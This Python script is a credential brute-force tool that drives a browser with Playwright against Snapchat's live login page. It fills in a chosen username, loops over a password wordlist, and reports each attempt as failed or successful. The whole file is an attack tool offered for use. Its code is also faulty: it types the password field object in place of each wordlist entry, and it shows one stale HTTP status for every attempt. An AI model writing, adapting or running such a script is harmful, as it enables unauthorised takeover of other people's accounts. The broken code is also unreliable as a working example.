from playwright.sync_api import sync_playwright
from colorama import Fore, Style, init
from pyfiglet import Figlet
import requests



init(autoreset=True)
LOGIN_URL = "https://accounts.snapchat.com/v2/login?continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-accounts%26referrer%3Dhttps%253A%252F%252Faccounts.snapchat.com%252Fv2%252Fwelcome"

STATUS = requests.get(LOGIN_URL).status_code

USER = input('[+]Enter the Username: ')
WORDLIST = input('[+]Enter the Wordlists Path: ')
print('=======================BruteForce Start 404================================')
with sync_playwright() as p:
    browser = p.chromium.launch(headless=False)#True  "dont show the Browser"
    context = browser.new_context()
    page = context.new_page()
    page.goto(LOGIN_URL)

    email = page.locator('input[name="accountIdentifier"]')
    email.fill("")
    email.type(USER, delay=20)
    next_btn = page.locator("button", has_text="Next")
    next_btn.click()



    with open(WORDLIST, "r", encoding="utf-8") as f:
        for i, passwd in enumerate(f, 1):
            passwd = passwd.strip()
            #
            password = page.locator('input[name="password"]')
            password.fill("")
            password.type(password, delay=20)
            next_btn = page.locator("button", has_text="Next")
            next_btn.click()
            #
            start_url = page.url
            #
            error = page.locator(
                "text=Incorrect password, please try again."

            )

            try:
                error.wait_for(state="visible", timeout=400000)
                print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.BLUE + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.RED + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.BLUE + " => Login Failed ❌"
                )
            except:
                page.wait_for_url(lambda url: url != start_url, timeout=40000)
                print(
                    Fore.YELLOW + f"[{i}] "
                    + Fore.GREEN + "Trying "
                    + Fore.WHITE + "Username: "
                    + Fore.GREEN + USER
                    + Fore.WHITE + " | Password: "
                    + Fore.GREEN + passwd
                    + Fore.WHITE + " | Status: "
                    + Fore.YELLOW + str(STATUS)
                    + Fore.GREEN + " => Login SUCCESS ✅"
                )
                break
    browser.close()


